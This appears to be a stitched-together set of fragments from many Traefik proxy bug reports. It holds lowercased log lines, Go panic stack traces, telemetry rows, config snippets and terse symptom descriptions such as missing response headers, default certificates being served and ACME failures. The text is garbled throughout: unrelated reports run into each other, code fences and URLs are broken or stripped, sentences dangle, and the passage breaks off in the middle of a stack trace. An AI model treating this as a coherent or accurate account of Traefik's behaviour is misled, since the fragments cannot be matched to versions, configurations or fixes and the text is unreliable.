1523049032804270629 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 38 https test ops-traefik-test-7.dm.vpc post http
1523049042804331835 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 58 https test ops-traefik-test-7.dm.vpc post http
1523049052804321188 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 75 https test ops-traefik-test-7.dm.vpc post http
1523049062804345771 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 52 https test ops-traefik-test-7.dm.vpc post http
1523049072804259874 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 76 https test ops-traefik-test-7.dm.vpc post http
1523049082804303541 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 64 https test ops-traefik-test-7.dm.vpc post http
1523049092804333183 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 36 https test ops-traefik-test-7.dm.vpc post http
1523049102804282481 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 24 https test ops-traefik-test-7.dm.vpc post http
1523049112804267528 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 25 https test ops-traefik-test-7.dm.vpc post http
1523049122804318223 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 14 https test ops-traefik-test-7.dm.vpc post http
1523049132804347212 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 27 https test ops-traefik-test-7.dm.vpc post http
``` </details>
alse proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-04-05t07:46:06z" level=info msg="loading acme account..." time="2018-04-05t07:46:06z" level=error msg="error creating tls config: unexpected end of json input" time="2018-04-05t07:46:06z" level=fatal msg="error preparing server: unexpected end of json input" ```
` ` requires authorisation before redirecting
this means user has to enter authorisation data twice, and the first authorisation data is sent over an insecure connection.
the content-type header value was text/plain; charset=utf-8 instead of text/css which made the swagger page to show its content and in a different way.
traefik using it's own default certificate and logging that the kubernetes secret doesn't exist
i let it run overnight to allow plenty of time for the secrets sync, but without luck
my container is filtered
![image](
a segfault: panic: runtime error: invalid memory address or nil pointer dereference
[signal sigsegv: segmentation violation code= addr= pc= ] goroutine 1 [running]:
github.com/containous/traefik/configuration.(*globalconfiguration).validateconfiguration( ) /go/src/github.com/containous/traefik/configuration/configuration.go:339 +
main.runcmd( , , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:159 +
main.main.func1( , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:53 +
github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:84 +
main.main() /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:141 +
error 500 - internal server error ### what version of traefik are you using? ```
version: v1.5.4
codename: cancoillotte
go version: go1.9.4
built: 2018-03-15_01:35:21pm
os/arch: linux/amd64
404 not found on #main-section
traefik starts round robin equally between active and passive
it does not honour the weights anymore.
stack error in go
traefik | time="2018-03-06t22:53:22z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
traefik | time="2018-03-06t22:53:22z" level=info msg="traefik version v1.5.3 built on 2018-02-27_02:47:04pm"
traefik | time="2018-03-06t22:53:22z" level=info msg="
traefik | stats collection is disabled.
traefik | help us improve traefik by turning this feature on :)
traefik | more details on: #collected-data
traefik | "
traefik | time="2018-03-06t22:53:22z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-03-06t22:53:22z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-03-06t22:53:22z" level=info msg="starting server on :80"
traefik | time="2018-03-06t22:53:40z" level=info msg="generating acme account..."
traefik | time="2018-03-06t22:55:08z" level=info msg=register...
traefik | time="2018-03-06t22:55:24z" level=error msg="error creating tls config: failed to post jws message
-> failed to http post to -> post net/http: timeout awaiting response headers"
traefik | time="2018-03-06t22:55:24z" level=fatal msg="error preparing server: failed to post jws message
-> failed to http post to -> post net/http: timeout awaiting response headers"
example-traefik | panic: runtime error: slice bounds out of range
example-traefik |
example-traefik | goroutine 1 [running]:
example-traefik | github.com/containous/traefik/vendor/github.com/miekg/dns.clientconfigfromfile( , , , , )
example-traefik | /go/src/github.com/containous/traefik/vendor/github.com/miekg/dns/clientconfig.go:86 +
example-traefik | github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.getnameservers( , , , , , , , )
example-traefik | /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/dns_challenge.go:40 +
example-traefik | github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.init()
example-traefik | /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/dns_challenge.go:33 +
example-traefik | github.com/containous/traefik/acme.init()
example-traefik | <autogenerated>:1 +
example-traefik | main.init()
example-traefik | <autogenerated>:1 +
example-web | [tue feb 27 09:49:28.315122 2018] [mpm_prefork:notice] [pid 1] ah00163: apache/2.4.10 (debian) configured -- resuming normal operations
example-web | [tue feb 27 09:49:28.315153 2018] [core:notice] [pid 1] ah00094: command line: 'apache2 -d foreground'
example | [tue feb 27 09:49:29.826700 2018] [mpm_event:notice] [pid 13:tid 140190014432448] ah00489: apache/2.4.25 (debian) configured -- resuming normal operations
example | [tue feb 27 09:49:29.826804 2018] [core:notice] [pid 13:tid 140190014432448] ah00094: command line: '/usr/sbin/apache2 -d foreground'
example-traefik exited with code 2
``` ### version [official docker image]( v1.5.0rc2, but same with v1.5.2
### environment & configuration ```toml
# based on defaultentrypoints = ["http"] [web]
address = ":8080"
every api call ends with error 404
the backend's response is forwarded to the client, but all http response headers are missing other than `content-type` and `content-length`
for example, `set-cookie` is missing, even though the backend is sending it
note that this problem affects **normal, non-error responses**
but the problem goes away if the error page feature is disabled.
a mixture of various examples config files, conceptual overviews, how-tos and discussions of specific features
don't get me wrong, a lot of this is good stuff, but it's more like a collection of support articles than a reference guide
for the record, the things i found most unclear as a new user were:
- inconsistent terminology, using the word 'backend' to mean both an upstream http server, and a source of configuration data
i would strongly recommend standardising on the term 'configuration *provider*' instead of 'configuration *backend*', to avoid this confusion.
- a lack of clarity about what configuration has to be set at startup, and what can be dynamically applied at runtime
- how multiple config providers interact with one another
can you define a frontend in one provider, and override some of its properties in another? or does each frontend have to live entirely within one provider? also do the frontends need to be given unique names, or is each provider a different namespace?
- when relative filenames are referenced in the config, how are they resolved? relative to the toml file where they appear, relative to `/etc/traefik`, relative to the cwd when traefik is executed, or something else?
`frontend-fallback` takes priority.
traefik failed silently and fell back to the default configuration.
too many redirects error
as a workaround i replaced the annotation: ` traefik.frontend.redirect.entrypoint: https` with: ``` #traefik.frontend.redirect.regex: ^ #traefik.frontend.redirect.replacement:
``` and have a functional deployment.
#### scenario 1
everything working perfectly fine
#### scenario 2
all 3 https requests failed with err_cert_authority_invalid
the returned certificate was the "traefik default cert".
connection is not established
response headders missing sec-websocket-protocol:
http/1.1 101 switching protocols
upgrade: websocket
connection: upgrade
sec-websocket-accept: wos9dpn1xghh5crw13jc1uv+zjo=
traefik not running.
in kv storage : `traefik/tracing/tracer` value is `<nil>`
two `http/1.1 100 continue` responses, without a final response from the downstream service.
after restart of traefik it was not able to run, instead i received this log entry ```
time="2018-02-20t11:47:45z" level=error msg="error creating tls config: tls: failed to find any pem data in certificate input"
a grpc error 500
looking at the debug traces the error states : missing "te" : "trailer" header.
i see the following in the logs: ```
proxy.1.goom36mvtfow@ip-10-1-0-20 | time="2018-02-19t16:30:59z" level=error msg="vulcand/oxy/forward/websocket: error dialing "dev.cloud": websocket: bad handshake with resp: 200 200 ok" proxy.1.goom36mvtfow@ip-10-1-0-20 | 10.0.0.126 - - [19/feb/2018:16:30:59 +0000] "get /wss http/1.1" 0 0 - "go-http-client/1.1" 6512 "websocket" " " 3ms
with `"period": "10s"` :
`unmarshaltypeerror: cannot unmarshal string into go value of type flaeg.duration` with `"period": 10` :
`recovered from panic in http handler: runtime error: integer divide by zero`
sporadically, and rarely, the page shows insecure, traefik delivers traefik default cert
`creating server server-nginx-1 at ` ```
debu[2018-02-16t10:23:10z] configuration received from provider docker: {"backends":{"backend-nginx":{"servers":{"server-nginx-1":{"url":" ","weight":0},"server-nginx-2":{"url":" ","weight":0},"server-nginx-3":{"url":" ","weight":0},"server-nginx-4":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-test-test-nl-0":{"entrypoints":["http"],"backend":"backend-nginx","routes":{"route-frontend-host-test-test-nl-0":{"rule":"host:test.test.nl"}},"passhostheader":true,"priority":0,"basicauth":[]}}}
debu[2018-02-16t10:23:10z] creating frontend frontend-host-test-test-nl-0
debu[2018-02-16t10:23:10z] wiring frontend frontend-host-test-test-nl-0 to entrypoint http
debu[2018-02-16t10:23:10z] creating route route-frontend-host-test-test-nl-0 host:test.test.nl
debu[2018-02-16t10:23:10z] creating backend backend-nginx
debu[2018-02-16t10:23:10z] creating load-balancer wrr
debu[2018-02-16t10:23:10z] creating server server-nginx-1 at with weight 0
debu[2018-02-16t10:23:10z] creating server server-nginx-2 at with weight 0
debu[2018-02-16t10:23:10z] creating server server-nginx-3 at with weight 0
debu[2018-02-16t10:23:10z] creating server server-nginx-4 at with weight 0...
traefik fails to forward websocket connections from iphone with the following errors logged
time="2018-02-07t03:42:41z" level=error msg="vulcand/oxy/forward/websocket: error when copying from client to backend: websocket: close 1006 (abnormal closure): unexpected eof"
time="2018-02-07t06:03:59z" level=error msg="vulcand/oxy/forward/websocket: error when copying from client to backend: read tcp 10.56.4.3:443->10.138.0.2:49209: read: connection timed out" ```
traefik 1.5 ignores all services with `endpoint_mode: dns_rr`
this is probably caused by #2490
while this fix prevents people from accidentally relying non-functional dns rr load-balancing it also blocks a previously working scenario.
an error occurred in traefik when applying ingress object and dashboard won't show new ingress object
error message:
level=error msg="template: :40:27: executing "" at <$frontend.redirecten...>: can\'t evaluate field redirectentrypoint in type *types.frontend" ```
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 | panic: runtime error: invalid memory address or nil pointer dereference
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 | [signal sigsegv: segmentation violation code= addr= pc= ]
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 |
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 | goroutine 123 [running]:
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 | github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getchallenges.func1( , , , , )
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 | /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:550 +
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 | created by github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getchallenges
traefik_traefik.0.msw1d7gplg0e@vm-mon-docker22 | /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:547 +
traefik_traefik.0.uix0fa50u95a@vm-mon-docker20 | time="2018-01-25t15:31:27z" level=error msg="datastore sync error: object lock value: expected f1ec4385-0616-4d5a-83c1-6796896c8b12, got , retrying in 521.065087ms"
traefik_traefik.0.kfc64oj0v8h4@vm-mon-docker21 | time="2018-01-25t15:31:27z" level=error msg="cannot unmarshall private key []"
traefik_traefik.0.kfc64oj0v8h4@vm-mon-docker21 | time="2018-01-25t15:31:27z" level=error msg="error building acme client &{email: registration:<nil> privatekey:[] domainscertificate:{certs:[] lock:{w:{state:0 sema:0} writersem:0 readersem:0 readercount:0 readerwait:0}} challengecerts:map[] httpchallenge:map[]}: private key was nil"
no new certificates
### possible problems / fixes
it looks like it has something to do with adding the http route to each domain (domain.com/.well-known/acme-challenge/[token])
when visiting the same route over https i receive an 404 directly
but via http timeouts
#l22 via slack someone (_maverick_) tried my same configuration but with a consul backend
maybe it has something to do with that? when checking de debug logs it seems it "cleansup" token for that domain before hitting the timeout
maybe it has something to do with that?
a go runtime error.
eventual timeout whilst loading the page.
an error due to a backend already being 'configured' within the template
cpu rises up to 100% cpu load
that is not happening.
instead, traefik will still try to obtain a certificate which it imho shouldn't: ```shell
debu[2018-01-06t11:54:50z] look for provided certificate to validate [foo.mydomain.io]...
debu[2018-01-06t11:54:50z] no provided certificate found for domains [foo.mydomain.io], get acme certificate.
debu[2018-01-06t11:54:50z] challenge getcertificate foo.mydomain.io
debu[2018-01-06t11:54:50z] acme got nothing foo.mydomain.io
debu[2018-01-06t11:54:50z] http: tls handshake error from 172.17.0.1:51722: eof
instead, the ip of the `ingress-sbox` pseudo-container, from the `ingress` network is shown, so all requests have the same ip
any processing of the access log is useless
this could end up in blacklisting the ingress ip, which would be pretty bad..
10.255.0.3 - - [05/jan/2018:07:01:43 +0000] "post /login http/1.1" 204 0 - "java/1.8.0_121" 9692 "host-app1-com-0" " " 1001ms
10.255.0.3 - - [05/jan/2018:07:01:43 +0000] "post /login http/1.1" 204 0 - "java/1.8.0_121" 9690 "host-app1-com-0" " " 1341ms
10.255.0.3 - - [05/jan/2018:07:01:43 +0000] "post /login http/1.1" 204 0 - "java/1.8.0_121" 9691 "host-tapp1-com-0" " " 1133ms
can see host rule in traefik ui and can access using browser.
no certificate generated using `onhostrule`
certificate does get generated when using `ondemand` but `ondemand` is being deprecated.
subdomain gets `traefik default cert`.
depending on resource size, requests either have some percentage of content length mismatches (1-10kb files) or cause timeouts and have large percentages of requests with missing body content (10kb+).
in one of my entrypoints it included the actual htpasswd content like: ```json
{ "auth": { "basic": { "users": [ "traefik-dashboard:$1234$abcdef" ], "usersfile": "" }, "digest": null, "forward": null, "headerfield": "" }
when starting up, for the containers with multiple labels as up there errors started to appear.
level=error msg="undefined backend ...
' and the traefik routing not working.
the whole string looks very weird then as it refers to an internal name in docker.
500 internal server error (and seee logs below)
```toml [backends."backend-client".loadbalancer] method = "wrr" sticky = false
``` **note:** this works as intended if i simply use the standard `traefik` prefix
setting the `prefix` to `stage.traefik` makes stickiness stop functioning.
fatal error: concurrent map writes
``` <details>
<summary>logs</summary> ```console
[root@ns3000001 ~]# docker service logs traefik | grep map | grep ncnc3bnddh65
traefik.1.ncnc3bnddh65@ns3000001 | fatal error: concurrent map writes
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | goroutine 7090 [running]:
traefik.1.ncnc3bnddh65@ns3000001 | runtime.throw( , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/panic.go:605 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | runtime.mapassign_faststr( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/hashmap_fast.go:607 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/abbot/go-http-auth.(*digestauth).requireauth( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/abbot/go-http-auth/digest.go:91 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/middlewares/auth.newauthenticator.func2( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:55 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/middlewares/auth.(*authenticator).servehttp( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:106 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/provider/web.(*provider).provide.func4.1( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/provider/web/web.go:139 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + fp= sp= pc=
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/13 10:42:11 server.go:2848: http: tls handshake error from 60.191.38.77:8128: eof
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 + fp= sp= pc=
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/13 11:42:01 server.go:2848: http: tls handshake error from 74.82.47.4:33132: tls: client offered an unsupported, maximum protocol version of 300
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/13 11:42:26 server.go:2848: http: tls handshake error from 74.82.47.4:43990: tls: no cipher suite supported by both client and server
traefik.1.ncnc3bnddh65@ns3000001 | net/http.serverhandler.servehttp( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2619 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*conn).serve( , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:1801 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | runtime.goexit()
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/13 16:57:39 server.go:2848: http: tls handshake error from 141.212.122.144:7365: tls: client offered an unsupported, maximum protocol version of 300
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/asm_amd64.s:2337 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | created by net/http.(*server).serve
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2720 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | goroutine 1 [chan receive, 1694 minutes]:
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).wait(...)
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:200
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/13 22:36:43 server.go:2848: http: tls handshake error from 198.143.155.141:34819: tls: no cipher suite supported by both client and server
traefik.1.ncnc3bnddh65@ns3000001 | main.run( )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:302 +
traefik.1.ncnc3bnddh65@ns3000001 | main.main.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:59 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:83 +
traefik.1.ncnc3bnddh65@ns3000001 | main.main()
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:227 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | goroutine 22 [select]:
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1.1.1( )
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 12:04:54 server.go:2848: http: tls handshake error from 77.72.83.110:45429: eof
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 12:04:54 server.go:2848: http: tls handshake error from 77.72.83.110:45504: tls: first record does not look like a tls handshake
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:171 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 13:07:54 server.go:2848: http: tls handshake error from 168.1.128.38:6666: eof
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 14:05:46 server.go:2848: http: tls handshake error from 184.105.247.194:6104: tls: client offered an unsupported, maximum protocol version of 300
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 14:06:13 server.go:2848: http: tls handshake error from 184.105.247.194:18238: tls: no cipher suite supported by both client and server
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | goroutine 9 [chan receive]:
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/golang/glog.(*loggingt).flushdaemon( )
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 16:58:37 server.go:2848: http: tls handshake error from 141.212.122.96:44183: tls: no cipher suite supported by both client and server
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:879 +
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/vendor/github.com/golang/glog.init.0
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 17:57:28 server.go:2848: http: tls handshake error from 154.47.32.66:64510: read tcp 172.18.0.6:443->154.47.32.66:64510: read: connection reset by peer
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:410 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/14 17:57:34 server.go:2848: http: tls handshake error from 141.212.122.16:59196: tls: no cipher suite supported by both client and server
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 12 [syscall, 1694 minutes]:
traefik.1.ncnc3bnddh65@ns3000001 | os/signal.signal_recv( )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/sigqueue.go:131 +
traefik.1.ncnc3bnddh65@ns3000001 | os/signal.loop()
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/os/signal/signal_unix.go:22 +
traefik.1.ubjug9usvfo0@ns3000001 | fatal error: concurrent map writes
traefik.1.ncnc3bnddh65@ns3000001 | created by os/signal.init.0
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | goroutine 23244 [running]:
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/os/signal/signal_unix.go:28 +
traefik.1.ubjug9usvfo0@ns3000001 | runtime.throw( , )
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/panic.go:605 + fp= sp= pc=
traefik.1.ubjug9usvfo0@ns3000001 | runtime.mapassign_faststr( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 13 [semacquire, 60 minutes]:
traefik.1.p3n7rmpiwf5j@ns3000001 | 2017/12/15 07:45:30 server.go:2848: http: tls handshake error from 60.191.38.77:31465: eof
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/hashmap_fast.go:685 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | sync.runtime_notifylistwait( , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/abbot/go-http-auth.(*digestauth).requireauth( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/sema.go:507 +
traefik.1.ncnc3bnddh65@ns3000001 | sync.(*cond).wait( )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/abbot/go-http-auth/digest.go:91 + fp= sp= pc=
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/middlewares/auth.newauthenticator.func2( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/sync/cond.go:56 +
traefik.1.ncnc3bnddh65@ns3000001 | io.(*pipe).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:55 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/io/pipe.go:47 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | io.(*pipereader).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/middlewares/auth.(*authenticator).servehttp( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/io/pipe.go:130 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:106 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | bufio.(*scanner).scan( , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/provider/web.(*provider).provide.func4.1( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/bufio/scan.go:207 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerscanner( , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/provider/web/web.go:139 + fp= sp= pc=
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:51 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerlevel
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:43 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 14 [chan receive, 254 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | main.checknewversion.func1()
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:349 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.serverhandler.servehttp( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2619 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*conn).serve( , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:1801 + fp= sp= pc=
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ubjug9usvfo0@ns3000001 | runtime.goexit()
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/asm_amd64.s:2337 + fp= sp= pc=
traefik.1.ubjug9usvfo0@ns3000001 | created by net/http.(*server).serve
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2720 +
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 15 [select, 1694 minutes, locked to thread]:
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | runtime.gopark( , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 1 [chan receive, 5645 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).wait(...)
